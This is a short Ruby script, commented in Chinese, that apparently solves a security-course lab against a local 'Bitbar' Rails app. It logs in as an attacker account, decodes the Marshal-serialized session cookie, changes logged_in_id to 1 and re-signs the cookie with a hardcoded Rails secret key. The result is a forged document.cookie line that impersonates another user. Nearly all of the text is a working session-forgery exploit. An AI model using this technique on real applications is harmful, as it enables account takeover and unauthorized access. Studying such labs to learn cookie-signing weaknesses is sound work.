require 'mechanize'
require 'rubygems'
require 'nokogiri'
# 创建Mechanize实例
agent = Mechanize.new
# 指定目标网站URL
url = "http://localhost:3000/login" 
#  发送 GET 请求获取登录页面的内容
page = agent.get(url)
# 获取页面上的第一个表单，登录表单
form = page.forms.first
# 用attacker的用户名和密码填写表单
form['username'] = form['password'] = 'attacker' 
# 提交表单，尝试登陆
agent.submit form 
# 指定会话名称
SESSION='_bitbar_session'
# 获取cookie并转为字符串
cookie = agent.cookie_jar.jar['localhost']['/'][SESSION].to_s.sub("#{SESSION}=", '')
# 分离签名
cookie_value, cookie_signature = cookie.split('--')  
# BASE64解码
raw_session = Base64.decode64(cookie_value) 
# 反序列化
session = Marshal.load(raw_session) 
# 修改logged_in_id字段，使服务器认证为user1
session['logged_in_id'] = 1
# 修改后的session正常加密
cookie_value = Base64.encode64(Marshal.dump(session)).split.join 
# 签名密钥
RAILS_SECRET='0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08'
#生成签名
cookie_signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, RAILS_SECRET, cookie_value)
# 拼接形成cookie
cookie_full = "#{SESSION}=#{cookie_value}--#{cookie_signature}"  #签名并合并
puts "document.cookie='#{cookie_full}';"
